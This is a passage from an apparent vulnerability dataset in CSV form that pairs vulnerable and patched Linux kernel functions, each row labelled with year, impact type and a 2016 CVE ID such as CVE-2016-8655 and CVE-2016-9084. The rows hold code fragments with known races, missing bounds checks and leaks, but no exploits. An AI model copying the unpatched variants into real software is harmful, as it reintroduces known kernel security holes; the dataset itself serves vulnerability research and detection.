	rc = assign_eip_far(ctxt, eip, &new_desc);
 if (rc != X86EMUL_CONTINUE) {
 	WARN_ON(ctxt->mode != X86EMUL_MODE_PROT64);
 ops->set_segment(ctxt, old_cs, &old_desc, 0, VCPU_SREG_CS);
	}
	return rc;
}

","static int em_jmp_far(struct x86_emulate_ctxt *ctxt)
{
	int rc;
	unsigned short sel;
	struct desc_struct new_desc;

	u8 cpl = ctxt->ops->cpl(ctxt);






	memcpy(&sel, ctxt->src.valptr + ctxt->op_bytes, 2);

	rc = __load_segment_descriptor(ctxt, sel, VCPU_SREG_CS, cpl,
		return rc;

	rc = assign_eip_far(ctxt, ctxt->src.val, &new_desc);
	/* Error handling is not implemented. */
	if (rc != X86EMUL_CONTINUE)
		return X86EMUL_UNHANDLEABLE;



	return rc;
}

{
	int rc;
	unsigned long eip, cs;

	int cpl = ctxt->ops->cpl(ctxt);
	struct desc_struct new_desc;






	rc = emulate_pop(ctxt, &eip, ctxt->op_bytes);
	if (rc != X86EMUL_CONTINUE)
	if (rc != X86EMUL_CONTINUE)
		return rc;
	rc = assign_eip_far(ctxt, eip, &new_desc);
 /* Error handling is not implemented. */
 if (rc != X86EMUL_CONTINUE)
 return X86EMUL_UNHANDLEABLE;

	return rc;
}

"
2016,DoS Overflow ,CVE-2016-9755," /* Jumbo payload inhibits frag. header */
 if (ipv6_hdr(skb)->payload_len == 0) {
 pr_debug(""payload len = 0\n"");
 return -EINVAL;
	}

 if (find_prev_fhdr(skb, &prevhdr, &nhoff, &fhoff) < 0)
 return -EINVAL;

 if (!pskb_may_pull(skb, fhoff + sizeof(*fhdr)))
 return -ENOMEM;
 if (err == -EINPROGRESS)
 return NF_STOLEN;

 return NF_ACCEPT;
}

static struct nf_hook_ops ipv6_defrag_ops[] = {
"," /* Jumbo payload inhibits frag. header */
 if (ipv6_hdr(skb)->payload_len == 0) {
 pr_debug(""payload len = 0\n"");
 return 0;
	}

 if (find_prev_fhdr(skb, &prevhdr, &nhoff, &fhoff) < 0)
 return 0;

 if (!pskb_may_pull(skb, fhoff + sizeof(*fhdr)))
 return -ENOMEM;
 if (err == -EINPROGRESS)
 return NF_STOLEN;

 return err == 0 ? NF_ACCEPT : NF_DROP;
}

static struct nf_hook_ops ipv6_defrag_ops[] = {
"
2017,#NAME?,CVE-2016-9754,"	    !cpumask_test_cpu(cpu_id, buffer->cpumask))
 return size;

	size = DIV_ROUND_UP(size, BUF_PAGE_SIZE);
	size *= BUF_PAGE_SIZE;

 /* we need a minimum of two pages */
 if (size < BUF_PAGE_SIZE * 2)
 size = BUF_PAGE_SIZE * 2;

 nr_pages = DIV_ROUND_UP(size, BUF_PAGE_SIZE);

 /*
	 * Don't succeed if resizing is disabled, as a reader might be
","	    !cpumask_test_cpu(cpu_id, buffer->cpumask))
 return size;

	nr_pages = DIV_ROUND_UP(size, BUF_PAGE_SIZE);


 /* we need a minimum of two pages */
 if (nr_pages < 2)
 nr_pages = 2;

 size = nr_pages * BUF_PAGE_SIZE;

 /*
	 * Don't succeed if resizing is disabled, as a reader might be
"
2016,DoS ,CVE-2016-9685,"					sbp->namelen,
					sbp->valuelen,
					&sbp->name[sbp->namelen]);
 if (error)

 return error;

 if (context->seen_enough)
 break;
		cursor->offset++;
				args.rmtblkcnt = xfs_attr3_rmt_blocks(
							args.dp->i_mount, valuelen);
				retval = xfs_attr_rmtval_get(&args);
 if (retval)
 return retval;
				retval = context->put_listent(context,
						entry->flags,
						name_rmt->name,
						(int)name_rmt->namelen,
						valuelen,
						args.value);
 kmem_free(args.value);
			} else {
				retval = context->put_listent(context,
","					sbp->namelen,
					sbp->valuelen,
					&sbp->name[sbp->namelen]);
 if (error) {
 kmem_free(sbuf);
 return error;
		}
 if (context->seen_enough)
 break;
		cursor->offset++;
				args.rmtblkcnt = xfs_attr3_rmt_blocks(
							args.dp->i_mount, valuelen);
				retval = xfs_attr_rmtval_get(&args);
 if (!retval)
					retval = context->put_listent(context,
							entry->flags,
							name_rmt->name,
							(int)name_rmt->namelen,
							valuelen,
							args.value);

 kmem_free(args.value);
			} else {
				retval = context->put_listent(context,
"
2016,,CVE-2016-9644,,
2018,Bypass ,CVE-2016-9604,,
2016,DoS ,CVE-2016-9588," return vmcs12->pin_based_vm_exec_control & PIN_BASED_POSTED_INTR;
}

static inline bool is_exception(u32 intr_info)
{
 return (intr_info & (INTR_INFO_INTR_TYPE_MASK | INTR_INFO_VALID_MASK))
		== (INTR_TYPE_HARD_EXCEPTION | INTR_INFO_VALID_MASK);
}

static void nested_vmx_vmexit(struct kvm_vcpu *vcpu, u32 exit_reason,
 if (is_machine_check(intr_info))
 return handle_machine_check(vcpu);

 if ((intr_info & INTR_INFO_INTR_TYPE_MASK) == INTR_TYPE_NMI_INTR)
 return 1;  /* already handled by vmx_vcpu_run() */

 if (is_no_device(intr_info)) {

 switch (exit_reason) {
 case EXIT_REASON_EXCEPTION_NMI:
 if (!is_exception(intr_info))
 return false;
 else if (is_page_fault(intr_info))
 return enable_ept;
 kvm_machine_check();

 /* We need to handle NMIs before interrupts are enabled */
 if ((exit_intr_info & INTR_INFO_INTR_TYPE_MASK) == INTR_TYPE_NMI_INTR &&
	    (exit_intr_info & INTR_INFO_VALID_MASK)) {
 kvm_before_handle_nmi(&vmx->vcpu);
 asm(""int $2"");
 kvm_after_handle_nmi(&vmx->vcpu);
"," return vmcs12->pin_based_vm_exec_control & PIN_BASED_POSTED_INTR;
}

static inline bool is_nmi(u32 intr_info)
{
 return (intr_info & (INTR_INFO_INTR_TYPE_MASK | INTR_INFO_VALID_MASK))
		== (INTR_TYPE_NMI_INTR | INTR_INFO_VALID_MASK);
}

static void nested_vmx_vmexit(struct kvm_vcpu *vcpu, u32 exit_reason,
 if (is_machine_check(intr_info))
 return handle_machine_check(vcpu);

 if (is_nmi(intr_info))
 return 1;  /* already handled by vmx_vcpu_run() */

 if (is_no_device(intr_info)) {

 switch (exit_reason) {
 case EXIT_REASON_EXCEPTION_NMI:
 if (is_nmi(intr_info))
 return false;
 else if (is_page_fault(intr_info))
 return enable_ept;
 kvm_machine_check();

 /* We need to handle NMIs before interrupts are enabled */
 if (is_nmi(exit_intr_info)) {

 kvm_before_handle_nmi(&vmx->vcpu);
 asm(""int $2"");
 kvm_after_handle_nmi(&vmx->vcpu);
"
2016,DoS ,CVE-2016-9576," struct iov_iter i;
 int ret;




 if (map_data)
		copy = true;
 else if (iov_iter_alignment(iter) & align)

unmap_rq:
 __blk_rq_unmap_user(bio);

	rq->bio = NULL;
 return -EINVAL;
}
"," struct iov_iter i;
 int ret;

 if (!iter_is_iovec(iter))
 goto fail;

 if (map_data)
		copy = true;
 else if (iov_iter_alignment(iter) & align)

unmap_rq:
 __blk_rq_unmap_user(bio);
fail:
	rq->bio = NULL;
 return -EINVAL;
}
"
2016,DoS ,CVE-2016-9555," return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);







 /* Now that we know we at least have a chunk header,
		 * do things that are type appropriate.
 */
			}
		}

 /* Report violation if chunk len overflows */
		ch_end = ((__u8 *)ch) + SCTP_PAD4(ntohs(ch->length));
 if (ch_end > skb_tail_pointer(skb))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

		ch = (sctp_chunkhdr_t *) ch_end;
	} while (ch_end < skb_tail_pointer(skb));

"," return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 /* Report violation if chunk len overflows */
		ch_end = ((__u8 *)ch) + SCTP_PAD4(ntohs(ch->length));
 if (ch_end > skb_tail_pointer(skb))
 return sctp_sf_violation_chunklen(net, ep, asoc, type, arg,
						  commands);

 /* Now that we know we at least have a chunk header,
		 * do things that are type appropriate.
 */
			}
		}







		ch = (sctp_chunkhdr_t *) ch_end;
	} while (ch_end < skb_tail_pointer(skb));

"
2016,DoS ,CVE-2016-9313," * 2 of the Licence, or (at your option) any later version.
 */


#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/file.h>
 */
static int __init big_key_init(void)
{
 return register_key_type(&key_type_big_key);
}

/*
 * Initialize big_key crypto and RNG algorithms
 */
static int __init big_key_crypto_init(void)
{
 int ret = -EINVAL;

 /* init RNG */
	big_key_rng = crypto_alloc_rng(big_key_rng_name, 0, 0);
 if (IS_ERR(big_key_rng)) {
		big_key_rng = NULL;
 return -EFAULT;
	}



 /* seed RNG */
	ret = crypto_rng_reset(big_key_rng, NULL, crypto_rng_seedsize(big_key_rng));
 if (ret)
 goto error;



 /* init block cipher */
	big_key_skcipher = crypto_alloc_skcipher(big_key_alg_name,
 0, CRYPTO_ALG_ASYNC);
 if (IS_ERR(big_key_skcipher)) {
		big_key_skcipher = NULL;
		ret = -EFAULT;
 goto error;







	}

 return 0;

error:


 crypto_free_rng(big_key_rng);
	big_key_rng = NULL;
 return ret;
}

device_initcall(big_key_init);
late_initcall(big_key_crypto_init);
"," * 2 of the Licence, or (at your option) any later version.
 */

#define pr_fmt(fmt) ""big_key: ""fmt
#include <linux/init.h>
#include <linux/seq_file.h>
#include <linux/file.h>
 */
static int __init big_key_init(void)
{
 struct crypto_skcipher *cipher;
 struct crypto_rng *rng;
 int ret;







	rng = crypto_alloc_rng(big_key_rng_name, 0, 0);
 if (IS_ERR(rng)) {
 pr_err(""Can't alloc rng: %ld\n"", PTR_ERR(rng));
 return PTR_ERR(rng);

	}

	big_key_rng = rng;

 /* seed RNG */
	ret = crypto_rng_reset(rng, NULL, crypto_rng_seedsize(rng));
 if (ret) {
 pr_err(""Can't reset rng: %d\n"", ret);
 goto error_rng;
	}

 /* init block cipher */
	cipher = crypto_alloc_skcipher(big_key_alg_name, 0, CRYPTO_ALG_ASYNC);
 if (IS_ERR(cipher)) {
		ret = PTR_ERR(cipher);
 pr_err(""Can't alloc crypto: %d\n"", ret);
 goto error_rng;
	}

	big_key_skcipher = cipher;

	ret = register_key_type(&key_type_big_key);
 if (ret < 0) {
 pr_err(""Can't register type: %d\n"", ret);
 goto error_cipher;
	}

 return 0;

error_cipher:
 crypto_free_skcipher(big_key_skcipher);
error_rng:
 crypto_free_rng(big_key_rng);

 return ret;
}

late_initcall(big_key_init);

"
2016,DoS ,CVE-2016-9191,"	ctl_dir = container_of(head, struct ctl_dir, header);

 if (!dir_emit_dots(file, ctx))
 return 0;

	pos = 2;

 break;
		}
	}

 sysctl_head_finish(head);
 return 0;
}
","	ctl_dir = container_of(head, struct ctl_dir, header);

 if (!dir_emit_dots(file, ctx))
 goto out;

	pos = 2;

 break;
		}
	}
out:
 sysctl_head_finish(head);
 return 0;
}
"
2016,#NAME?,CVE-2016-9178,"#define __get_user_asm_ex(x, addr, itype, rtype, ltype)			\
 asm volatile(""1:	mov""itype"" %1,%""rtype""0\n""		\
 ""2:\n""						\
 _ASM_EXTABLE_EX(1b, 2b)				\




		     : ltype(x) : ""m"" (__m(addr)))

#define __put_user_nocheck(x, ptr, size)			\
","#define __get_user_asm_ex(x, addr, itype, rtype, ltype)			\
 asm volatile(""1:	mov""itype"" %1,%""rtype""0\n""		\
 ""2:\n""						\
 "".section .fixup,\""ax\""\n""				\
 ""3:xor""itype"" %""rtype""0,%""rtype""0\n""		\
 ""  jmp 2b\n""					\
 "".previous\n""					\
 _ASM_EXTABLE_EX(1b, 3b)				\
		     : ltype(x) : ""m"" (__m(addr)))

#define __put_user_nocheck(x, ptr, size)			\
"
2016,DoS +Priv ,CVE-2016-9120," kref_get(&handle->ref);
}

static int ion_handle_put(struct ion_handle *handle)









{
 struct ion_client *client = handle->client;
 int ret;

 mutex_lock(&client->lock);
	ret = kref_put(&handle->ref, ion_handle_destroy);
 mutex_unlock(&client->lock);

 return ret;
 return ERR_PTR(-EINVAL);
}

static struct ion_handle *ion_handle_get_by_id(struct ion_client *client,
 int id)
{
 struct ion_handle *handle;

 mutex_lock(&client->lock);
	handle = idr_find(&client->idr, id);
 if (handle)
 ion_handle_get(handle);
 mutex_unlock(&client->lock);

 return handle ? handle : ERR_PTR(-EINVAL);
}













static bool ion_handle_validate(struct ion_client *client,
 struct ion_handle *handle)
{
}
EXPORT_SYMBOL(ion_alloc);

void ion_free(struct ion_client *client, struct ion_handle *handle)
{
 bool valid_handle;

 BUG_ON(client != handle->client);

 mutex_lock(&client->lock);
	valid_handle = ion_handle_validate(client, handle);

 if (!valid_handle) {
 WARN(1, ""%s: invalid handle passed to free.\n"", __func__);
 mutex_unlock(&client->lock);
 return;
	}









 mutex_unlock(&client->lock);
 ion_handle_put(handle);
}
EXPORT_SYMBOL(ion_free);

	{
 struct ion_handle *handle;

		handle = ion_handle_get_by_id(client, data.handle.handle);
 if (IS_ERR(handle))


 return PTR_ERR(handle);
 ion_free(client, handle);
 ion_handle_put(handle);


 break;
	}
 case ION_IOC_SHARE:
"," kref_get(&handle->ref);
}

static int ion_handle_put_nolock(struct ion_handle *handle)
{
 int ret;

	ret = kref_put(&handle->ref, ion_handle_destroy);

 return ret;
}

int ion_handle_put(struct ion_handle *handle)
{
 struct ion_client *client = handle->client;
 int ret;

 mutex_lock(&client->lock);
	ret = ion_handle_put_nolock(handle);
 mutex_unlock(&client->lock);

 return ret;
 return ERR_PTR(-EINVAL);
}

static struct ion_handle *ion_handle_get_by_id_nolock(struct ion_client *client,
 int id)
{
 struct ion_handle *handle;


	handle = idr_find(&client->idr, id);
 if (handle)
 ion_handle_get(handle);


 return handle ? handle : ERR_PTR(-EINVAL);
}

struct ion_handle *ion_handle_get_by_id(struct ion_client *client,
 int id)
{
 struct ion_handle *handle;

 mutex_lock(&client->lock);
	handle = ion_handle_get_by_id_nolock(client, id);
 mutex_unlock(&client->lock);

 return handle;
}

static bool ion_handle_validate(struct ion_client *client,
 struct ion_handle *handle)
{
}
EXPORT_SYMBOL(ion_alloc);

static void ion_free_nolock(struct ion_client *client, struct ion_handle *handle)
{
 bool valid_handle;

 BUG_ON(client != handle->client);


	valid_handle = ion_handle_validate(client, handle);

 if (!valid_handle) {
 WARN(1, ""%s: invalid handle passed to free.\n"", __func__);

 return;
	}
 ion_handle_put_nolock(handle);
}

void ion_free(struct ion_client *client, struct ion_handle *handle)
{
 BUG_ON(client != handle->client);

 mutex_lock(&client->lock);
 ion_free_nolock(client, handle);
 mutex_unlock(&client->lock);

}
EXPORT_SYMBOL(ion_free);

	{
 struct ion_handle *handle;

 mutex_lock(&client->lock);
		handle = ion_handle_get_by_id_nolock(client, data.handle.handle);
 if (IS_ERR(handle)) {
 mutex_unlock(&client->lock);
 return PTR_ERR(handle);
		}
 ion_free_nolock(client, handle);
 ion_handle_put_nolock(handle);
 mutex_unlock(&client->lock);
 break;
	}
 case ION_IOC_SHARE:
"
2016,DoS Overflow ,CVE-2016-9084,"
	} else if (cmd == VFIO_DEVICE_SET_IRQS) {
 struct vfio_irq_set hdr;

		u8 *data = NULL;
 int ret = 0;

		minsz = offsetofend(struct vfio_irq_set, count);

 if (copy_from_user(&hdr, (void __user *)arg, minsz))
 return -EFAULT;

 if (hdr.argsz < minsz || hdr.index >= VFIO_PCI_NUM_IRQS ||

		    hdr.flags & ~(VFIO_IRQ_SET_DATA_TYPE_MASK |
				  VFIO_IRQ_SET_ACTION_TYPE_MASK))
 return -EINVAL;

 if (!(hdr.flags & VFIO_IRQ_SET_DATA_NONE)) {
  size_t size;
 int max = vfio_pci_get_irq_count(vdev, hdr.index);

 if (hdr.flags & VFIO_IRQ_SET_DATA_BOOL)
				size = sizeof(uint8_t);
 else if (hdr.flags & VFIO_IRQ_SET_DATA_EVENTFD)
				size = sizeof(int32_t);
 else
 return -EINVAL;








  if (hdr.argsz - minsz < hdr.count * size ||
  hdr.start >= max || hdr.start + hdr.count > max)
 return -EINVAL;

			data = memdup_user((void __user *)(arg + minsz),
 if (!is_irq_none(vdev))
 return -EINVAL;

	vdev->ctx = kzalloc(nvec * sizeof(struct vfio_pci_irq_ctx), GFP_KERNEL);
 if (!vdev->ctx)
 return -ENOMEM;

","
	} else if (cmd == VFIO_DEVICE_SET_IRQS) {
 struct vfio_irq_set hdr;
 size_t size;
		u8 *data = NULL;
 int max, ret = 0;

		minsz = offsetofend(struct vfio_irq_set, count);

 if (copy_from_user(&hdr, (void __user *)arg, minsz))
 return -EFAULT;

 if (hdr.argsz < minsz || hdr.index >= VFIO_PCI_NUM_IRQS ||
		    hdr.count >= (U32_MAX - hdr.start) ||
		    hdr.flags & ~(VFIO_IRQ_SET_DATA_TYPE_MASK |
				  VFIO_IRQ_SET_ACTION_TYPE_MASK))
 return -EINVAL;

 max = vfio_pci_get_irq_count(vdev, hdr.index);
 if (hdr.start >= max || hdr.start + hdr.count > max)
 return -EINVAL;

 switch (hdr.flags & VFIO_IRQ_SET_DATA_TYPE_MASK) {
 case VFIO_IRQ_SET_DATA_NONE:
			size = 0;
 break;
 case VFIO_IRQ_SET_DATA_BOOL:
			size = sizeof(uint8_t);
 break;
 case VFIO_IRQ_SET_DATA_EVENTFD:
			size = sizeof(int32_t);
 break;
 default:
 return -EINVAL;
		}

 if (size) {
 if (hdr.argsz - minsz < hdr.count * size)
 return -EINVAL;

			data = memdup_user((void __user *)(arg + minsz),
 if (!is_irq_none(vdev))
 return -EINVAL;

	vdev->ctx = kcalloc(nvec, sizeof(struct vfio_pci_irq_ctx), GFP_KERNEL);
 if (!vdev->ctx)
 return -ENOMEM;

"
2016,DoS Overflow Mem. Corr. Bypass ,CVE-2016-9083,"
	} else if (cmd == VFIO_DEVICE_SET_IRQS) {
 struct vfio_irq_set hdr;

		u8 *data = NULL;
 int ret = 0;

		minsz = offsetofend(struct vfio_irq_set, count);

 if (copy_from_user(&hdr, (void __user *)arg, minsz))
 return -EFAULT;

 if (hdr.argsz < minsz || hdr.index >= VFIO_PCI_NUM_IRQS ||

		    hdr.flags & ~(VFIO_IRQ_SET_DATA_TYPE_MASK |
				  VFIO_IRQ_SET_ACTION_TYPE_MASK))
 return -EINVAL;

 if (!(hdr.flags & VFIO_IRQ_SET_DATA_NONE)) {
  size_t size;
 int max = vfio_pci_get_irq_count(vdev, hdr.index);

 if (hdr.flags & VFIO_IRQ_SET_DATA_BOOL)
				size = sizeof(uint8_t);
 else if (hdr.flags & VFIO_IRQ_SET_DATA_EVENTFD)
				size = sizeof(int32_t);
 else
 return -EINVAL;








  if (hdr.argsz - minsz < hdr.count * size ||
  hdr.start >= max || hdr.start + hdr.count > max)
 return -EINVAL;

			data = memdup_user((void __user *)(arg + minsz),
 if (!is_irq_none(vdev))
 return -EINVAL;

	vdev->ctx = kzalloc(nvec * sizeof(struct vfio_pci_irq_ctx), GFP_KERNEL);
 if (!vdev->ctx)
 return -ENOMEM;

","
	} else if (cmd == VFIO_DEVICE_SET_IRQS) {
 struct vfio_irq_set hdr;
 size_t size;
		u8 *data = NULL;
 int max, ret = 0;

		minsz = offsetofend(struct vfio_irq_set, count);

 if (copy_from_user(&hdr, (void __user *)arg, minsz))
 return -EFAULT;

 if (hdr.argsz < minsz || hdr.index >= VFIO_PCI_NUM_IRQS ||
		    hdr.count >= (U32_MAX - hdr.start) ||
		    hdr.flags & ~(VFIO_IRQ_SET_DATA_TYPE_MASK |
				  VFIO_IRQ_SET_ACTION_TYPE_MASK))
 return -EINVAL;

 max = vfio_pci_get_irq_count(vdev, hdr.index);
 if (hdr.start >= max || hdr.start + hdr.count > max)
 return -EINVAL;

 switch (hdr.flags & VFIO_IRQ_SET_DATA_TYPE_MASK) {
 case VFIO_IRQ_SET_DATA_NONE:
			size = 0;
 break;
 case VFIO_IRQ_SET_DATA_BOOL:
			size = sizeof(uint8_t);
 break;
 case VFIO_IRQ_SET_DATA_EVENTFD:
			size = sizeof(int32_t);
 break;
 default:
 return -EINVAL;
		}

 if (size) {
 if (hdr.argsz - minsz < hdr.count * size)
 return -EINVAL;

			data = memdup_user((void __user *)(arg + minsz),
 if (!is_irq_none(vdev))
 return -EINVAL;

	vdev->ctx = kcalloc(nvec, sizeof(struct vfio_pci_irq_ctx), GFP_KERNEL);
 if (!vdev->ctx)
 return -ENOMEM;

"
2016,DoS ,CVE-2016-8666," /* This is non-zero if the packet may be of the same flow. */
	u8	same_flow:1;

 /* Used in udp_gro_receive */
	u8	udp_mark:1;

 /* GRO checksum is valid */
	u8	csum_valid:1;
 NAPI_GRO_CB(skb)->same_flow = 0;
 NAPI_GRO_CB(skb)->flush = 0;
 NAPI_GRO_CB(skb)->free = 0;
 NAPI_GRO_CB(skb)->udp_mark = 0;
 NAPI_GRO_CB(skb)->gro_remcsum_start = 0;

 /* Setup for GRO checksum validation */
 return pp;
}














#define SECONDS_PER_DAY 86400

/* inet_current_timestamp - Return IP network timestamp
static const struct net_offload ipip_offload = {
	.callbacks = {
		.gso_segment	= inet_gso_segment,
		.gro_receive	= inet_gro_receive,
		.gro_complete	= ipip_gro_complete,
	},
};
 struct packet_offload *ptype;
	__be16 type;






	off = skb_gro_offset(skb);
	hlen = off + sizeof(*greh);
	greh = skb_gro_header_fast(skb, off);
 unsigned int off = skb_gro_offset(skb);
 int flush = 1;

 if (NAPI_GRO_CB(skb)->udp_mark ||
	    (skb->ip_summed != CHECKSUM_PARTIAL &&
 NAPI_GRO_CB(skb)->csum_cnt == 0 &&
	     !NAPI_GRO_CB(skb)->csum_valid))
 goto out;

 /* mark that this skb passed once through the udp gro layer */
 NAPI_GRO_CB(skb)->udp_mark = 1;

 rcu_read_lock();
	uo_priv = rcu_dereference(udp_offload_base);
 return pp;
}














static int ipv6_gro_complete(struct sk_buff *skb, int nhoff)
{
 const struct net_offload *ops;
static const struct net_offload sit_offload = {
	.callbacks = {
		.gso_segment	= ipv6_gso_segment,
		.gro_receive    = ipv6_gro_receive,
		.gro_complete   = sit_gro_complete,
	},
};
"," /* This is non-zero if the packet may be of the same flow. */
	u8	same_flow:1;

 /* Used in tunnel GRO receive */
	u8	encap_mark:1;

 /* GRO checksum is valid */
	u8	csum_valid:1;
 NAPI_GRO_CB(skb)->same_flow = 0;
 NAPI_GRO_CB(skb)->flush = 0;
 NAPI_GRO_CB(skb)->free = 0;
 NAPI_GRO_CB(skb)->encap_mark = 0;
 NAPI_GRO_CB(skb)->gro_remcsum_start = 0;

 /* Setup for GRO checksum validation */
 return pp;
}

static struct sk_buff **ipip_gro_receive(struct sk_buff **head,
 struct sk_buff *skb)
{
 if (NAPI_GRO_CB(skb)->encap_mark) {
 NAPI_GRO_CB(skb)->flush = 1;
 return NULL;
	}

 NAPI_GRO_CB(skb)->encap_mark = 1;

 return inet_gro_receive(head, skb);
}

#define SECONDS_PER_DAY 86400

/* inet_current_timestamp - Return IP network timestamp
static const struct net_offload ipip_offload = {
	.callbacks = {
		.gso_segment	= inet_gso_segment,
		.gro_receive	= ipip_gro_receive,
		.gro_complete	= ipip_gro_complete,
	},
};
 struct packet_offload *ptype;
	__be16 type;

 if (NAPI_GRO_CB(skb)->encap_mark)
 goto out;

 NAPI_GRO_CB(skb)->encap_mark = 1;

	off = skb_gro_offset(skb);
	hlen = off + sizeof(*greh);
	greh = skb_gro_header_fast(skb, off);
 unsigned int off = skb_gro_offset(skb);
 int flush = 1;

 if (NAPI_GRO_CB(skb)->encap_mark ||
	    (skb->ip_summed != CHECKSUM_PARTIAL &&
 NAPI_GRO_CB(skb)->csum_cnt == 0 &&
	     !NAPI_GRO_CB(skb)->csum_valid))
 goto out;

 /* mark that this skb passed once through the tunnel gro layer */
 NAPI_GRO_CB(skb)->encap_mark = 1;

 rcu_read_lock();
	uo_priv = rcu_dereference(udp_offload_base);
 return pp;
}

static struct sk_buff **sit_gro_receive(struct sk_buff **head,
 struct sk_buff *skb)
{
 if (NAPI_GRO_CB(skb)->encap_mark) {
 NAPI_GRO_CB(skb)->flush = 1;
 return NULL;
	}

 NAPI_GRO_CB(skb)->encap_mark = 1;

 return ipv6_gro_receive(head, skb);
}

static int ipv6_gro_complete(struct sk_buff *skb, int nhoff)
{
 const struct net_offload *ops;
static const struct net_offload sit_offload = {
	.callbacks = {
		.gso_segment	= ipv6_gso_segment,
		.gro_receive    = sit_gro_receive,
		.gro_complete   = sit_gro_complete,
	},
};
"
2016,DoS ,CVE-2016-8660,,
2016,DoS Overflow ,CVE-2016-8658,"				(u8 *)&settings->beacon.head[ie_offset],
				settings->beacon.head_len - ie_offset,
				WLAN_EID_SSID);
 if (!ssid_ie)
 return -EINVAL;

 memcpy(ssid_le.SSID, ssid_ie->data, ssid_ie->len);
","				(u8 *)&settings->beacon.head[ie_offset],
				settings->beacon.head_len - ie_offset,
				WLAN_EID_SSID);
 if (!ssid_ie || ssid_ie->len > IEEE80211_MAX_SSID_LEN)
 return -EINVAL;

 memcpy(ssid_le.SSID, ssid_ie->data, ssid_ie->len);
"
2016,DoS +Priv ,CVE-2016-8655,"
 if (optlen != sizeof(val))
 return -EINVAL;
 if (po->rx_ring.pg_vec || po->tx_ring.pg_vec)
 return -EBUSY;
 if (copy_from_user(&val, optval, sizeof(val)))
 return -EFAULT;
 switch (val) {
 case TPACKET_V1:
 case TPACKET_V2:
 case TPACKET_V3:
			po->tp_version = val;
 return 0;
 default:
 return -EINVAL;
		}









	}
 case PACKET_RESERVE:
	{
 /* Added to avoid minimal code churn */
 struct tpacket_req *req = &req_u->req;


 /* Opening a Tx-ring is NOT supported in TPACKET_V3 */
 if (!closing && tx_ring && (po->tp_version > TPACKET_V2)) {
 net_warn_ratelimited(""Tx-ring is not supported.\n"");
 goto out;
	}

 lock_sock(sk);

 /* Detach socket from network */
 spin_lock(&po->bind_lock);
 if (!tx_ring)
 prb_shutdown_retire_blk_timer(po, rb_queue);
	}
 release_sock(sk);

 if (pg_vec)
 free_pg_vec(pg_vec, order, req->tp_block_nr);
out:

 return err;
}

","
 if (optlen != sizeof(val))
 return -EINVAL;


 if (copy_from_user(&val, optval, sizeof(val)))
 return -EFAULT;
 switch (val) {
 case TPACKET_V1:
 case TPACKET_V2:
 case TPACKET_V3:
 break;

 default:
 return -EINVAL;
		}
 lock_sock(sk);
 if (po->rx_ring.pg_vec || po->tx_ring.pg_vec) {
			ret = -EBUSY;
		} else {
			po->tp_version = val;
			ret = 0;
		}
 release_sock(sk);
 return ret;
	}
 case PACKET_RESERVE:
	{
 /* Added to avoid minimal code churn */
 struct tpacket_req *req = &req_u->req;

 lock_sock(sk);
 /* Opening a Tx-ring is NOT supported in TPACKET_V3 */
 if (!closing && tx_ring && (po->tp_version > TPACKET_V2)) {
 net_warn_ratelimited(""Tx-ring is not supported.\n"");
 goto out;
	}



 /* Detach socket from network */
 spin_lock(&po->bind_lock);
 if (!tx_ring)
 prb_shutdown_retire_blk_timer(po, rb_queue);
	}


 if (pg_vec)
 free_pg_vec(pg_vec, order, req->tp_block_nr);
out:
 release_sock(sk);
 return err;
}

"
2016,DoS Mem. Corr. ,CVE-2016-8650," if (!esize) {
 /* Exponent is zero, result is 1 mod MOD, i.e., 1 or 0
		 * depending on if MOD equals 1.  */
		rp[0] = 1;
		res->nlimbs = (msize == 1 && mod->d[0] == 1) ? 0 : 1;






		res->sign = 0;
 goto leave;
	}
"," if (!esize) {
 /* Exponent is zero, result is 1 mod MOD, i.e., 1 or 0
		 * depending on if MOD equals 1.  */

		res->nlimbs = (msize == 1 && mod->d[0] == 1) ? 0 : 1;
 if (res->nlimbs) {
 if (mpi_resize(res, 1) < 0)
 goto enomem;
			rp = res->d;
			rp[0] = 1;
		}
		res->sign = 0;
 goto leave;
	}
"
2016,DoS ,CVE-2016-8646," struct sock *sk2;
 struct alg_sock *ask2;
 struct hash_ctx *ctx2;

 int err;

	err = crypto_ahash_export(req, state);




 if (err)
 return err;

	sk2 = newsock->sk;
	ask2 = alg_sk(sk2);
	ctx2 = ask2->private;
	ctx2->more = 1;




	err = crypto_ahash_import(&ctx2->req, state);
 if (err) {
"," struct sock *sk2;
 struct alg_sock *ask2;
 struct hash_ctx *ctx2;
 bool more;
 int err;

 lock_sock(sk);
	more = ctx->more;
	err = more ? crypto_ahash_export(req, state) : 0;
 release_sock(sk);

 if (err)
 return err;

	sk2 = newsock->sk;
	ask2 = alg_sk(sk2);
	ctx2 = ask2->private;
	ctx2->more = more;

 if (!more)
 return err;

	err = crypto_ahash_import(&ctx2->req, state);
 if (err) {
"
2016,DoS ,CVE-2016-8645,"
bool tcp_prequeue(struct sock *sk, struct sk_buff *skb);
bool tcp_add_backlog(struct sock *sk, struct sk_buff *skb);


#undef STATE_TRACE

}
EXPORT_SYMBOL(tcp_add_backlog);
















/*
 *	From tcp_input.c
 */

 nf_reset(skb);

 if (sk_filter(sk, skb))
 goto discard_and_relse;



	skb->dev = NULL;

 if (skb->protocol == htons(ETH_P_IP))
 return tcp_v4_do_rcv(sk, skb);

 if (sk_filter(sk, skb))
 goto discard;

 /*
 if (tcp_v6_inbound_md5_hash(sk, skb))
 goto discard_and_relse;

 if (sk_filter(sk, skb))
 goto discard_and_relse;



	skb->dev = NULL;

","
bool tcp_prequeue(struct sock *sk, struct sk_buff *skb);
bool tcp_add_backlog(struct sock *sk, struct sk_buff *skb);
int tcp_filter(struct sock *sk, struct sk_buff *skb);

#undef STATE_TRACE

}
EXPORT_SYMBOL(tcp_add_backlog);

int tcp_filter(struct sock *sk, struct sk_buff *skb)
{
 struct tcphdr *th = (struct tcphdr *)skb->data;
 unsigned int eaten = skb->len;
 int err;

	err = sk_filter_trim_cap(sk, skb, th->doff * 4);
 if (!err) {
		eaten -= skb->len;
 TCP_SKB_CB(skb)->end_seq -= eaten;
	}
 return err;
}
EXPORT_SYMBOL(tcp_filter);

/*
 *	From tcp_input.c
 */

 nf_reset(skb);

 if (tcp_filter(sk, skb))
 goto discard_and_relse;
	th = (const struct tcphdr *)skb->data;
	iph = ip_hdr(skb);

	skb->dev = NULL;

 if (skb->protocol == htons(ETH_P_IP))
